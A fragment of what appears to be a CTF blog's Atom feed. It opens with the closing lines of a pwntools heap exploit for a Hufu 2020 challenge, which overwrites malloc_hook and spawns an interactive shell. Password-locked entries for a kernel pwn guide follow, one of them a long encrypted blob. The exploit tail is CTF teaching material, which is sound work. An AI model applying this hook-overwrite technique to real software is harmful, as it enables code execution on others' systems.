class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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